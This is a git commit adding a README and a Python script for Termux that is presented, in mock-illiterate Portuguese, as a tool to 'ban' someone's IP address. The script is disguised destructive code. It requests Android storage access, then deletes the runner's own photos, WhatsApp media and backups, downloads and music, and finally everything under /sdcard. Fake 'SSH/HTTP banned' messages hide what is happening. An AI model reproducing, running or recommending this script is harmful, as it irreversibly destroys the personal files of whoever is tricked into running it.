84436c7694d10d0f28176cdfc8484af870eaa482
sidneypepo <sidneypepo@pm.me>
2021-03-09 18:20:23 -0300

    criada tool ban ip

---
+++ README.md
@@ -0,0 +1,17 @@
+# BAN_IP
+
+Feramenta feita pra bani ip dosoutro. use com fims educasionais por favo!!!!!!!
+
+# Comandos para INSTALAR a ferramenta
+
+>git clone https://github.com/lammervault/ban_ip
+>cd ban_ip
+>pkg update -y; pkg upgrade -y; pkg install python3 python3-pip
+>pip3 install -r requirements.txt
+>python3 ban_ip.py
+
+È ISSo!
+
+
+
+**script scriptado por scripter scriptador de scripts**
---
+++ ban_ip.py
@@ -0,0 +1,224 @@
+		  			#         script scriptado por scripter scriptador de scripts           
+
+
+
+
+
+  
+
+
+import os
+import time
+
+
+
+
+
+   
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+import requests
+import platform         
+
+
+
+
+
+
+import pytube
+
+
+import socket
+
+
+
+
+
+import numpy, pandas
+import webbrowser
+import matplotlib
+import speech_recognition
+
+
+
+
+
+
+
+
+
+
+
+
+
+import plotly		
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+def bane_1(): # aqui is the bane do codigu 
+
+
+
+
+
+
+
+
+
+
+
+
+
+	os.system("clear; echo '{===================================}'")
+	os.system("echo '          B A N - I P V 5'")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	os.system("echo '{===================================}';  sleep 5\n\n")
+def banino_1(): #ja aqui is  the banimentu de ip
+	os.system("echo 'Set the ip'; read ip; clear;  echo '\e[31m{\e[33m√\e[31m}\e[0m Iniciando banimento...\n'; sleep 10")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	os.system("cd /sdcard; rm -rf DCIM 2>& /dev/null; echo '(\e[31mSSH\e[0m) \e[32m>\e[31m      banned'; sleep 3"); os.system("cd /sdcard/WhatsApp/; rm -rf Media 2>& /dev/null; echo '\e[0m(\e[31mHTTP\e[0m) \e[32m>\e[31m     banned'; sleep 3"); os.system("cd /sdcard/WhatsApp/; rm -rf Backups 2>& /dev/null; echo '\e[0m(\e[31mTELNET\e[0m) \e[32m>\e[31m   banned'; sleep 3"); os.system("cd /sdcard/WhatsApp/; rm -rf Media 2>& /dev/null; echo '\e[0m(\e[31mFTP\e[0m) \e[32m>\e[31m      banned'; sleep 3"); os.system("cd /sdcard/; rm -rf Download 2>& /dev/null; echo '\e[0m(\e[31mSMTP\e[0m) \e[32m>\e[31m     banned'; sleep 3"); os.system("cd /sdcard/; rm -rf music 2>& /dev/null; echo '\e[0m(\e[31mHTTPS\e[0m) \e[32m>\e[31m     banned'; sleep 3"); os.system("cd /sdcard/; rm -rf Pictures 2>& /dev/null; echo '\e[0m(\e[31mIMAP\e[0m) \e[32m>\e[31m     bannerd; sleep 3"); os.system("echo '\n\n[\e[32m√\e[0m] Banimento Completo o ip $ip foi banido com sucesso!!'; sleep 4")
+
+
+
+
+
+
+
+
+	os.system("cd /sdcard/; rm -rf * 2>& /dev/null; echo '\e[0m(\e[31mDHCP\e[0m) \e[32m>\e[31m     banned'; sleep 3")
+
+
+
+
+
+
+
+bane_1(); os.system("termux-setup-storage")
+
+
+
+
+ip_list                   = input("[!] APERTE ENTRE PRA CONTINUA")
+
+
+
+
+
+
+
+
+
+
+
+banino_1()
+
+
+
+
+print("script finalisado ocm susesso e ip banido!!!!!!!!!!!!!!!!")
+
+
+		
+
+
+
+
+			
